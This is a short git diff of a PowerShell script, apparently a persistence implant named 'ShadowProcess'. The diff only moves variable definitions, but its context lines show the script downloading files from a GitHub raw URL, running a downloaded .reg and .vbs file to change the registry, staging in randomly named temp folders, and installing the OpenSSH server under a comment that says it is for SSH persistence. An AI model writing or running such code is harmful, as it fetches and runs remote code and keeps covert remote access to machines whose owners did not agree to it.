@@ -1,4 +1,9 @@
 #Recursos
+
+#Variables 
+$wd = random_text
+$path = "$env:temp/$wd"
+$initial_dir = $PWD.Path
 #String random nombre de directorios.
 function random_text {
 	return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
@@ -46,10 +51,6 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/re
 #instalando registro
 ./"$reg_file.reg";"$vbs_file.vbs"
 
-#Variables 
-$wd = random_text
-$path = "$env:temp/$wd"
-$initial_dir = $PWD.Path
 
 # estableciendo persistencia ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
